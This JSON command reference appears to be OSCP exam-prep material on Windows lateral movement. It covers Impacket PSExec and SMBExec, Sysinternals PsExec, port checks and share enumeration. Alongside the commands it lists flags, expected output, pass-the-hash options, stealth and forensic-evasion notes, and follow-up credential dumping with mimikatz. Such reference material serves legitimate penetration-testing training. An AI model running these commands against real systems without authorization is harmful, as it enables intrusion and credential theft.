{
  "commands": [
    {
      "id": "psexec-impacket-shell",
      "name": "PSExec - Impacket Interactive Shell",
      "description": "Execute Impacket PSExec from Kali to gain SYSTEM-level interactive shell on remote Windows via SMB",
      "command": "impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Domain name (or use '.' for local authentication)",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username with local admin rights on target",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password or use -hashes for pass-the-hash",
          "example": "Nexus123!",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP address",
          "example": "192.168.50.73",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "psexec",
        "impacket",
        "lateral-movement",
        "active-directory",
        "kali",
        "smb",
        "system",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "psexec-sysinternals",
        "smbexec-impacket-fileless",
        "wmi-impacket-exec",
        "evil-winrm-creds"
      ],
      "next_steps": [],
      "flag_explanations": {
        "-hashes :NTLM": "Pass-the-hash with NTLM hash instead of password",
        "-target-ip": "Specify IP if hostname resolution fails",
        "-no-pass": "Don't prompt for password (use with -hashes)",
        "-k": "Use Kerberos authentication (requires TGT)",
        "-dc-ip": "Domain Controller IP for Kerberos authentication"
      },
      "success_indicators": [
        "[*] Requesting shares on <TARGET>",
        "[*] Uploading file",
        "[*] Opening SVCManager on <TARGET>",
        "C:\\Windows\\system32>"
      ],
      "failure_indicators": [
        "[-] SMB SessionError: STATUS_LOGON_FAILURE",
        "STATUS_ACCESS_DENIED",
        "STATUS_OBJECT_NAME_NOT_FOUND",
        "Connection timeout"
      ],
      "troubleshooting": {
        "STATUS_LOGON_FAILURE": "Invalid credentials. Verify with: crackmapexec smb <TARGET> -u <USER> -p <PASS>",
        "STATUS_ACCESS_DENIED": "User not local admin. Test admin access: crackmapexec smb <TARGET> -u <USER> -p <PASS> (look for Pwn3d!)",
        "STATUS_OBJECT_NAME_NOT_FOUND": "ADMIN$ share not accessible. Verify firewall allows File and Printer Sharing",
        "Connection timeout": "Firewall blocking SMB: sudo nmap -p 445 -Pn -v <TARGET>",
        "UAC restriction": "Built-in local admin accounts blocked by UAC (except RID 500 Administrator). Use domain user or RID 500"
      },
      "notes": "EDUCATIONAL CONTEXT:\nPSExec is classic lateral movement technique providing SYSTEM-level shell immediately.\n\nWHY THIS WORKS:\nUploads binary to ADMIN$ share, creates Windows service, executes payload as SYSTEM.\n\nHOW IT WORKS:\n1) Connects to IPC$ share, 2) Uploads RemCom.exe to ADMIN$ share, 3) Creates/starts service via SCM, 4) Service executes RemCom.exe as SYSTEM, 5) Spawns cmd.exe shell.\n\nADVANTAGES:\nSpawns SYSTEM shell (highest privilege), most reliable for OSCP, well-documented.\n\nDISADVANTAGES:\nWrites binary to disk (forensics), creates service (event logs), easier to detect than WMI/DCOM.\n\nMANUAL ALTERNATIVE:\nMicrosoft PsExec64.exe from Sysinternals (see psexec-sysinternals).\n\nUAC LIMITATION:\n2014 Microsoft patch blocks local admin PTH for non-RID-500 accounts (domain users unaffected).\n\nCLEANUP:\nPSExec automatically cleans up service and binary on exit.\n\nBEHIND THE SCENES:\nService creation generates Event ID 7045, authentication creates 4624, process creation 4688.\n\nTIME ESTIMATE:\n1-2 minutes for connection establishment.\n\nEXAM TIP:\nFirst lateral movement technique to try when credentials available - most stable and straightforward.",
      "oscp_relevance": "high",
      "methodology_guidance": {
        "after_success": "mimikatz-sekurlsa-logonpasswords  # Dump credentials from LSASS as SYSTEM secretsdump-hashes  # Alternative credential dump with impacket ad-user-enumeration  # Enumerate domain accounts"
      }
    },
    {
      "id": "psexec-sysinternals",
      "name": "PSExec - Microsoft Sysinternals (Kerberos)",
      "description": "Execute Microsoft official PsExec64.exe from compromised Windows host (requires Kerberos authentication)",
      "command": "PsExec64.exe -accepteula \\\\<TARGET> -u <DOMAIN>\\<USER> -p <PASS> cmd",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target hostname or IP",
          "example": "DC01",
          "required": true
        },
        {
          "name": "<DOMAIN>",
          "description": "Domain name",
          "example": "corp",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username with local admin rights",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Nexus123!",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "psexec",
        "sysinternals",
        "lateral-movement",
        "active-directory",
        "windows",
        "kerberos",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "psexec-impacket-shell",
        "psexec-sysinternals-interactive"
      ],
      "next_steps": [],
      "flag_explanations": {
        "-accepteula": "Automatically accept EULA (suppresses license agreement prompt)",
        "\\\\<TARGET>": "Remote computer name or IP (double backslash syntax)",
        "-u": "Username in DOMAIN\\user format",
        "-p": "Password for authentication",
        "-i": "Interactive session (allocates desktop)",
        "-s": "Run as SYSTEM account (default)",
        "-d": "Don't wait for process to terminate (non-interactive)",
        "-c": "Copy specified program to remote system"
      },
      "success_indicators": [
        "PsExec v2.",
        "Starting PSEXESVC service on <TARGET>",
        "Connecting with PsExec service on <TARGET>",
        "Microsoft Windows [Version"
      ],
      "failure_indicators": [
        "Access is denied",
        "Couldn't access <TARGET>",
        "The network path was not found",
        "The account is not authorized to log in from this station"
      ],
      "troubleshooting": {
        "Access is denied": "User needs local admin rights. Verify: net localgroup administrators /domain",
        "Network path not found": "Verify target reachable: ping <TARGET>",
        "Couldn't access target": "ADMIN$ share blocked. Check firewall: Test-NetConnection <TARGET> -Port 445",
        "Account not authorized": "Kerberos authentication issue. Try IP address instead of hostname",
        "No EULA accepted": "Add -accepteula flag to suppress license prompt"
      },
      "notes": "OSCP TRAINING MATERIAL - PSEXEC FROM SYSINTERNALS SUITE:\nTRAINING EXAMPLE:\nFrom OSCP module, jen's credentials used from CLIENT74 to move laterally to FILES04:\n'PS C:\\Tools\\SysinternalsSuite> .\\PsExec64.exe -i \\\\FILES04 -u corp\\jen -p Nexus123! cmd'\n\nOutput confirmed successful lateral movement:\n- PsExec v2.4 banner\n- Interactive cmd.exe shell on FILES04\n- 'whoami' returned 'corp\\jen'\n- 'hostname' returned 'FILES04'\n\nTHREE PREREQUISITES (CRITICAL - FROM TRAINING):\n1.\n\nUser must be part of Administrators local group\n2.\n\nADMIN$ share must be available  \n3.\n\nFile and Printer Sharing has to be turned on\n\nTraining explicitly states:\n\"Luckily for us, the last two requirements are already met as they are the default settings on modern Windows Server systems.\"\n\nHOW PSEXEC WORKS (TECHNICAL BREAKDOWN FROM TRAINING):\n1.\n\nWrites psexesvc.exe into C:\\Windows directory on target\n2.\n\nCreates and spawns a service on the remote host  \n3.\n\nRuns the requested program/command as a child process of psexesvc.exe\n\nThis is why you see 'Starting PSEXESVC service' in the output.\n\nEXECUTION CONTEXT:\nFrom training scenario:\n- Attacker already had RDP access as offsec local admin on CLIENT74\n- PsExec binary available at C:\\Tools\\SysinternalsSuite (full suite pre-installed)\n- Executed 64-bit version (PsExec64.exe) for modern Windows targets\n- Used -i flag for interactive session (spawns visible cmd.exe shell)\n\nFLAG BREAKDOWN:\n- -i:\nInteractive mode (required for visible shell in training example)\n- \\\\FILES04:\nTarget server (double backslash UNC path syntax)\n- -u corp\\jen:\nDomain\\username format (jen is domain user + local admin on FILES04)\n- -p Nexus123!:\nPassword in plaintext\n- cmd:\nCommand to execute (spawns interactive command shell)\n\nSYSINTERNALS SUITE LOCATION IN OSCP LABS:\nC:\\Tools\\SysinternalsSuite\n- Full suite includes:\nPsExec, PsInfo, PsKill, PsList, etc.\n- Available on compromised Windows clients in OSCP environment\n- No download needed - pre-staged in common locations\n\nKERBEROS VS NTLM:\n- Sysinternals PSExec uses Kerberos authentication (requires hostname or FQDN)\n- Cannot use IP addresses directly (Kerberos requires SPN with hostname)\n- Impacket PSExec uses NTLM (IP addresses work)\n\nMICROSOFT LEGITIMACY:\n- Signed by Microsoft Corporation\n- Trusted by Windows Defender and enterprise AV\n- Appears as legitimate admin tool in logs\n- Whitelisted by default on most corporate systems\n\nWHEN TO USE IN OSCP:\n- Already pivoted to Windows client (CLIENT74, CLIENT76, etc.)\n- Have domain credentials with local admin rights\n- Target hostname known (not just IP)\n- Want most reliable/stable lateral movement from Windows\n\nCOMPARISON - SYSINTERNALS VS IMPACKET PSEXEC:\n- Sysinternals:\nWindows→Windows, Kerberos, hostname required, Microsoft-signed\n- Impacket:\nKali→Windows, NTLM, IP addresses work, Python-based\n\nSERVICE CREATION (FORENSIC ARTIFACT):\n- Event ID 7045:\nService installed (PSEXESVC)\n- Service Name:\nPSEXESVC\n- Service File Name:\n%SystemRoot%\\PSEXESVC.exe\n- Service Type:\nUser mode service\n- Service Start Type:\nDemand start\n\nCLEANUP:\nPSExec automatically removes PSEXESVC.exe and stops/deletes service on exit (clean disconnection).\n\nTIME ESTIMATE:\n2-3 minutes (including locating binary, command construction, execution).\n\nEXAM STRATEGY:\nUse Impacket PSExec from Kali for initial lateral movement.\n\nUse Sysinternals PSExec when pivoting through compromised Windows clients with domain credentials.",
      "oscp_relevance": "high",
      "methodology_guidance": {
        "after_success": "psexec-sysinternals-interactive  # Use -i flag for interactive desktop session mimikatz-sekurlsa-logonpasswords  # Dump credentials as SYSTEM"
      }
    },
    {
      "id": "psexec-sysinternals-interactive",
      "name": "PSExec - Interactive Desktop Session",
      "description": "Launch interactive GUI application on remote system with visible desktop using PsExec -i flag",
      "command": "PsExec64.exe -accepteula \\\\<TARGET> -u <DOMAIN>\\<USER> -p <PASS> -i <SESSION_ID> <COMMAND>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target hostname or IP",
          "example": "DC01",
          "required": true
        },
        {
          "name": "<DOMAIN>",
          "description": "Domain name",
          "example": "corp",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password",
          "example": "Nexus123!",
          "required": true
        },
        {
          "name": "<SESSION_ID>",
          "description": "Session ID to interact with (use 1 for first logged-on user, query user to find)",
          "example": "1",
          "required": false
        },
        {
          "name": "<COMMAND>",
          "description": "GUI application to launch (cmd, notepad, explorer, etc.)",
          "example": "cmd",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "psexec",
        "sysinternals",
        "lateral-movement",
        "active-directory",
        "windows",
        "interactive",
        "oscp:medium"
      ],
      "prerequisites": [],
      "alternatives": [
        "psexec-sysinternals"
      ],
      "next_steps": [],
      "flag_explanations": {
        "-i <SESSION_ID>": "Interactive mode - run in specified user session (desktop visible to user)",
        "query user": "Run on target to enumerate session IDs before using -i",
        "-accepteula": "Accept license agreement automatically",
        "-s": "Run as SYSTEM (default)",
        "-d": "Don't wait for process to complete"
      },
      "success_indicators": [
        "Starting PSEXESVC service",
        "Connecting with PsExec service",
        "Application launches on target user desktop",
        "Process visible in task manager on target"
      ],
      "failure_indicators": [
        "Access is denied",
        "Session ID not found",
        "No user logged in to session"
      ],
      "troubleshooting": {
        "Session ID not found": "Query sessions first: PsExec64.exe \\\\<TARGET> -u <USER> -p <PASS> query user",
        "No user logged in": "Can't use -i without active session. Use regular psexec-sysinternals instead",
        "Application doesn't appear": "User may not have focus on desktop. Verify process running: tasklist",
        "Access denied": "User needs local admin rights and active desktop session"
      },
      "notes": "EDUCATIONAL CONTEXT:\nPSExec -i flag spawns process in user's interactive desktop session (Session 1+) instead of Session 0 (services).\n\nWHY SESSION 0 vs SESSION 1+:\nWindows services run in Session 0 (non-interactive, no GUI), user desktops run in Session 1+ (interactive).\n\nDEFAULT BEHAVIOR:\nWithout -i, PSExec spawns in Session 0 - GUI apps invisible.\n\nUSE CASE:\nSocial engineering (spawn message to user), GUI tool demonstration, test interactive applications.\n\nBEHIND THE SCENES:\n-i flag tells PSEXESVC service to create process in specified session ID.\n\nQUERY SESSIONS:\nUse 'query user' or 'query session' to enumerate session IDs on target.\n\nCOMMON SESSION IDS:\nSession 0 = services, Session 1 = first logged-on user, Session 2+ = additional users (RDP, fast user switching).\n\nSTEALTH:\nVisible process to logged-in user - not stealthy.\n\nTIME ESTIMATE:\n3-5 minutes including session enumeration.\n\nEXAM TIP:\nRarely needed for OSCP - use standard psexec for command execution.\n\nInteractive mode more relevant for social engineering or GUI testing.",
      "oscp_relevance": "medium",
      "methodology_guidance": {
        "after_success": "psexec-sysinternals  # Use without -i for non-interactive SYSTEM shell"
      }
    },
    {
      "id": "smbexec-impacket-fileless",
      "name": "SMBExec - Impacket Fileless Shell",
      "description": "Semi-interactive shell via SMB using Impacket SMBExec - fileless alternative to PSExec (no binary written to disk)",
      "command": "impacket-smbexec <DOMAIN>/<USER>:<PASS>@<TARGET>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Domain name (or use '.' for local authentication)",
          "example": "corp.com",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username with local admin rights",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password or use -hashes for pass-the-hash",
          "example": "Nexus123!",
          "required": true
        },
        {
          "name": "<TARGET>",
          "description": "Target IP address",
          "example": "192.168.50.73",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "smbexec",
        "impacket",
        "lateral-movement",
        "active-directory",
        "kali",
        "fileless",
        "smb",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [
        "psexec-impacket-shell",
        "wmi-impacket-exec",
        "evil-winrm-creds"
      ],
      "next_steps": [],
      "flag_explanations": {
        "-hashes :NTLM": "Pass-the-hash with NTLM hash instead of password",
        "-mode SHARE": "Use ADMIN$ share for execution (default)",
        "-mode SERVER": "Create temporary SMB server for output retrieval",
        "-shell-type powershell": "Use PowerShell instead of cmd.exe",
        "-codec utf-8": "Set character encoding for special characters"
      },
      "success_indicators": [
        "[!] Launching semi-interactive shell",
        "C:\\Windows\\system32>",
        "Commands execute successfully"
      ],
      "failure_indicators": [
        "[-] SMB SessionError: STATUS_LOGON_FAILURE",
        "STATUS_ACCESS_DENIED",
        "STATUS_OBJECT_NAME_NOT_FOUND"
      ],
      "troubleshooting": {
        "STATUS_LOGON_FAILURE": "Invalid credentials. Verify: crackmapexec smb <TARGET> -u <USER> -p <PASS>",
        "STATUS_OBJECT_NAME_NOT_FOUND": "ADMIN$ share not accessible. Check firewall allows File and Printer Sharing",
        "Slower execution": "Expected - creates and deletes batch file per command for output retrieval",
        "No output returned": "Try -mode SERVER for alternative output method"
      },
      "notes": "EDUCATIONAL CONTEXT:\nSMBExec provides fileless lateral movement alternative to PSExec for maximum stealth and minimal forensic footprint.\n\nHOW IT WORKS:\n1) Creates temporary batch file in ADMIN$ share, 2) Executes batch file via service, 3) Batch file runs command and redirects output to temp file, 4) SMBExec retrieves output via SMB, 5) Deletes batch and output files.\n\nFILELESS BENEFIT:\nNo persistent binary on disk (unlike PSExec which uploads RemCom.exe).\n\nSTEALTH:\nLess detectable than PSExec - no binary signature, no service binary, only batch files (auto-deleted).\n\nDISADVANTAGES:\nSlower than PSExec (file creation/deletion per command), less stable for long sessions.\n\nCOMPARISON:\nPSExec (fast, stable, binary on disk) vs SMBExec (slow, stealthy, fileless).\n\nUSE CASE:\nMaximum stealth required, antivirus detection concern, forensic evasion.\n\nSERVICE CREATION:\nStill creates service for execution (Event ID 7045) but no persistent binary.\n\nOUTPUT MODES:\n-mode SHARE (default, uses ADMIN$) vs -mode SERVER (creates temp SMB server on Kali).\n\nTIME ESTIMATE:\n2-4 minutes for initial connection, slower per-command execution.\n\nEXAM TIP:\nUse SMBExec when PSExec detected/blocked by AV, or when stealth is priority over speed.",
      "oscp_relevance": "high",
      "methodology_guidance": {
        "after_success": "mimikatz-sekurlsa-logonpasswords  # Dump credentials as SYSTEM ad-user-enumeration  # Enumerate domain accounts"
      }
    },
    {
      "id": "psexec-verify-firewall",
      "name": "PSExec - Verify File and Printer Sharing Ports",
      "description": "Verify required ports for PSExec are open (SMB 445 and RPC 135 for service creation)",
      "command": "sudo nmap -p 445,135 -Pn -sV -v <TARGET>",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP address",
          "example": "192.168.50.73",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "psexec",
        "verification",
        "enumeration",
        "nmap",
        "smb",
        "active-directory"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [],
      "flag_explanations": {
        "-p 445,135": "Scan SMB (445) and RPC (135) ports required for PSExec",
        "-Pn": "Skip ping - treat host as online (bypass ping filtering)",
        "-sV": "Service version detection - identify exact SMB/RPC version",
        "-v": "Verbose output - show progress during scan",
        "sudo": "Required for SYN scan and accurate OS/service detection"
      },
      "success_indicators": [
        "445/tcp open  microsoft-ds",
        "135/tcp open  msrpc",
        "Service Info: OS: Windows"
      ],
      "failure_indicators": [
        "445/tcp filtered",
        "135/tcp closed",
        "Host seems down"
      ],
      "troubleshooting": {
        "Both ports filtered": "Firewall blocking File and Printer Sharing. Try alternative: WinRM (5985), WMI (135 only)",
        "Port 445 open, 135 closed": "SMB accessible but service creation may fail. Try smbexec-impacket-fileless",
        "Host seems down": "Target blocking ICMP. Use -Pn flag (already included) to skip ping",
        "Connection timeout": "Network unreachable. Verify routing: ip route get <TARGET>"
      },
      "notes": "EDUCATIONAL CONTEXT:\nPSExec requires both SMB (445) and RPC (135) ports - verify before attempting lateral movement to save time.\n\nWHY BOTH PORTS:\nPort 445 for ADMIN$ share access (binary upload), port 135 for service creation via RPC.\n\nFIREWALL DEFAULTS:\nWindows Server enables File and Printer Sharing by default, workstations often block it.\n\nSERVICE DETECTION:\n-sV flag identifies SMB version (SMBv1, SMBv2, SMBv3) - important for compatibility.\n\nMANUAL ALTERNATIVE:\nTest SMB manually:\nsmbclient -L //<TARGET> -U <USER>.\n\nALTERNATIVE PORTS:\nIf 445 blocked, PSExec won't work - use WinRM (5985) or WMI (135 only).\n\nBEHIND THE SCENES:\nnmap sends SYN packets to ports, analyzes responses, fingerprints services.\n\nSTEALTH:\nThis is enumeration - creates logs on target (connection attempts).\n\nTIME ESTIMATE:\n30 seconds to 1 minute for port scan.\n\nEXAM TIP:\nAlways verify ports before exploitation attempts - prevents wasted time troubleshooting authentication when ports are blocked.",
      "oscp_relevance": "high",
      "methodology_guidance": {
        "after_success": "psexec-impacket-shell  # If both ports open, proceed with PSExec",
        "on_failure": "smbexec-impacket-fileless  # If only 445 open, use fileless alternative"
      }
    },
    {
      "id": "cme-smb-shares",
      "name": "CrackMapExec - Enumerate SMB Shares",
      "description": "Enumerate accessible SMB shares on target including ADMIN$, C$, IPC$ using CrackMapExec",
      "command": "crackmapexec smb <TARGET> -u <USER> -p <PASS> --shares",
      "category": "active-directory",
      "subcategory": "lateral-movement",
      "variables": [
        {
          "name": "<TARGET>",
          "description": "Target IP or hostname",
          "example": "192.168.50.73",
          "required": true
        },
        {
          "name": "<USER>",
          "description": "Username",
          "example": "administrator",
          "required": true
        },
        {
          "name": "<PASS>",
          "description": "Password or use -H for NTLM hash",
          "example": "Nexus123!",
          "required": true
        }
      ],
      "tags": [
        "oscp",
        "crackmapexec",
        "cme",
        "smb",
        "enumeration",
        "lateral-movement",
        "active-directory",
        "kali",
        "oscp:high"
      ],
      "prerequisites": [],
      "alternatives": [],
      "next_steps": [],
      "flag_explanations": {
        "--shares": "Enumerate all accessible SMB shares",
        "-u <USER>": "Username for authentication",
        "-p <PASS>": "Password for authentication",
        "-H <NTLM>": "Use NTLM hash for pass-the-hash",
        "-d <DOMAIN>": "Specify domain for authentication",
        "--local-auth": "Use local authentication instead of domain"
      },
      "success_indicators": [
        "[+] <DOMAIN>\\<USER>:<PASS> (Pwn3d!)",
        "ADMIN$         READ,WRITE",
        "C$             READ,WRITE",
        "IPC$           READ"
      ],
      "failure_indicators": [
        "[-] Authentication failed",
        "STATUS_LOGON_FAILURE",
        "STATUS_ACCESS_DENIED"
      ],
      "troubleshooting": {
        "Authentication failed": "Verify credentials: crackmapexec smb <TARGET> -u <USER> -p <PASS>",
        "No Pwn3d indicator": "User authenticated but not local admin - ADMIN$ not accessible",
        "ADMIN$ not in list": "User lacks admin rights. PSExec will fail",
        "Connection timeout": "Port 445 blocked. Check: sudo nmap -p 445 -Pn -v <TARGET>"
      },
      "notes": "EDUCATIONAL CONTEXT:\nShare enumeration confirms ADMIN$ accessibility - prerequisite for PSExec lateral movement.\n\nWHY ADMIN$ MATTERS:\nPSExec uploads binary to ADMIN$ share, creates service, executes payload.\n\nPWNED INDICATOR:\n[+] Pwn3d! confirms user has local administrator rights on target.\n\nDEFAULT SHARES:\nADMIN$ (C:\\Windows), C$ (C:\\), IPC$ (inter-process communication), print$ (printer drivers).\n\nCUSTOM SHARES:\nAdditional shares may contain sensitive data - enumerate contents.\n\nPERMISSIONS:\nREAD,WRITE on ADMIN$ required for PSExec.\n\nREAD-only means user not admin.\n\nALTERNATIVE TOOLS:\nsmbclient -L //<TARGET> -U <USER> (manual), smbmap -u <USER> -p <PASS> -H <TARGET> (detailed permissions).\n\nBEHIND THE SCENES:\nAuthenticates to IPC$ share, queries share list via SRVSVC RPC pipe.\n\nTIME ESTIMATE:\n<30 seconds for share enumeration.\n\nEXAM TIP:\nAlways verify ADMIN$ accessible before attempting PSExec - saves time troubleshooting failed exploitation.",
      "oscp_relevance": "high",
      "methodology_guidance": {
        "after_success": "psexec-impacket-shell  # If Pwn3d! shown and ADMIN$ accessible, proceed with PSExec"
      }
    }
  ]
}
